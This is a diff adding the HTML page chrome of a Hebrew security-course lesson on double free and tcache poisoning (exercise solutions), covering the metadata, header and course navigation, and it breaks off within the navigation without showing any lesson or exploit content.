@@ -1,0 +1,3106 @@
+
+<!doctype html>
+<html lang="he" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="נעבור תרגיל אחרי תרגיל עם הפקודות האמיתיות, הפלט הצפוי וה-exploit המלא. כל הכתובות וה-offset-ים בפלט מתייחסים ל-libc ספציפי (libc-2.31 מ-Ubuntu 20.04,...">
+      
+      
+        <meta name="author" content="עמית פנחסי">
+      
+      
+        <link rel="canonical" href="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/">
+      
+      
+        <link rel="prev" href="../7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/">
+      
+      
+        <link rel="next" href="../7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS הזנת" href="../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="הזנת RSS של תוכן מעודכן" href="../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>7.3 - שחרור כפול וtcache poisoning - פתרון - עמית טק</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Heebo:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Heebo";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/themes.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+  
+
+  <!-- Primary Meta Tags (name="description" is rendered by base.html from page.meta.description;
+       og:type/title/description/url and twitter:card/title/description are injected per-page by
+       the built-in social plugin - see material/plugins/social/templates/default.yml) -->
+  <meta name="author" content="עמית פנחסי">
+  <meta name="robots" content="index, follow">
+  <meta property="og:locale" content="he_IL">
+  <meta property="og:site_name" content="עמית טק">
+
+  
+  
+
+  <!-- Organization / WebSite structured data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "Organization",
+        "@id": "https://amittech.dev/#organization",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "logo": "https://amittech.dev/amittech.png",
+        "founder": {
+          "@type": "Person",
+          "name": "עמית פנחסי"
+        },
+        "sameAs": ["https://discord.gg/ef5PQAAca2"]
+      },
+      {
+        "@type": "WebSite",
+        "@id": "https://amittech.dev/#website",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "description": "קורסי סייבר, תכנות, IT ומחשבים בחינם בעברית - מעל 2000 שעות לימוד עם תרגול מעשי. מתאים למתחילים ולמתקדמים.",
+        "inLanguage": "he",
+        "publisher": { "@id": "https://amittech.dev/#organization" }
+      },
+      {
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "עמית טק",
+            "item": "https://amittech.dev/"
+          },
+          {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "7.3 - \u05e9\u05d7\u05e8\u05d5\u05e8 \u05db\u05e4\u05d5\u05dc \u05d5tcache poisoning - \u05e4\u05ea\u05e8\u05d5\u05df",
+            "item": "https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/"
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+
+  <!-- Apply saved theme before first paint (prevents flash of default theme) -->
+  <script>
+    (function () {
+      /* Dark-based theme ids; everything else is treated as a light (default) scheme. */
+      var DARK = {
+        midnight: 1, dracula: 1, nord: 1, gruvbox: 1, "solarized-dark": 1,
+        matrix: 1, amber: 1, synthwave: 1, ocean: 1, emerald: 1, rose: 1, violet: 1
+      };
+      var id;
+      try { id = localStorage.getItem("am-theme"); } catch (e) { id = null; }
+      if (!id) id = "light";
+      var root = document.documentElement;
+      root.setAttribute("data-theme", id);
+      root.setAttribute("data-md-color-scheme", DARK[id] ? "slate" : "default");
+    })();
+  </script>
+
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="7.3 - שחרור כפול וtcache poisoning - פתרון - עמית טק" />
+<meta property="og:description" content="נעבור תרגיל אחרי תרגיל עם הפקודות האמיתיות, הפלט הצפוי וה-exploit המלא. כל הכתובות וה-offset-ים בפלט מתייחסים ל-libc ספציפי (libc-2.31 מ-Ubuntu 20.04,..." />
+<meta property="og:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="7.3 - שחרור כפול וtcache poisoning - פתרון - עמית טק" />
+<meta property="twitter:description" content="נעבור תרגיל אחרי תרגיל עם הפקודות האמיתיות, הפלט הצפוי וה-exploit המלא. כל הכתובות וה-offset-ים בפלט מתייחסים ל-libc ספציפי (libc-2.31 מ-Ubuntu 20.04,..." />
+<meta property="twitter:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F.png" />
+</head>
+  
+  
+    <body dir="rtl">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#-tcache-poisoning" class="md-skip">
+          לדלג לתוכן
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="כותרת עליונה">
+    <a href="../../../.." title="עמית טק" class="md-header__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            עמית טק
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              7.3 - שחרור כפול וtcache poisoning - פתרון
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="חיפוש" placeholder="חיפוש" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="חיפוש">
+        
+        <button type="reset" class="md-search__icon md-icon" title="ניקוי" aria-label="ניקוי" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            אתחול חיפוש
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="לשוניות" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  דף הבית
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  מי אני
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  בלוג
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  תכנות
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  רשתות ומערכות הפעלה
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  אבטחת מידע וסייבר
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  מחקר ו-Low Level
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="ניווט" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="עמית טק" class="md-nav__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    עמית טק
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    דף הבית
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מי אני
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../blog/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    בלוג
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    רשתות ומערכות הפעלה
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    אבטחת מידע וסייבר
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר ו-Low Level
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר ו-Low Level
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ליבת המחשב
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר חולשות
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר חולשות
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../0%20-%20%D7%94%D7%A7%D7%93%D7%9E%D7%94%20%D7%95%D7%AA%D7%A9%D7%AA%D7%99%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0   הקדמה ותשתית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../1%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%A4%D7%A9%D7%95%D7%98%D7%95%D7%AA%20%D7%95%D7%91%D7%90%D7%92%D7%99%D7%9D%20%D7%9C%D7%95%D7%92%D7%99%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1   חולשות פשוטות ובאגים לוגיים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../2%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20%D7%97%D7%95%D7%A6%D7%A5%20%D7%A2%D7%9C%20%D7%94%D7%9E%D7%97%D7%A1%D7%A0%D7%99%D7%AA/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2   גלישת חוצץ על המחסנית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../3%20-%20Shellcode/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3   Shellcode
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4   עקיפת NX וROP בסיסי
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../5%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%9E%D7%97%D7%A8%D7%95%D7%96%D7%AA%20%D7%A4%D7%95%D7%A8%D7%9E%D7%98/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5   חולשות מחרוזת פורמט
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
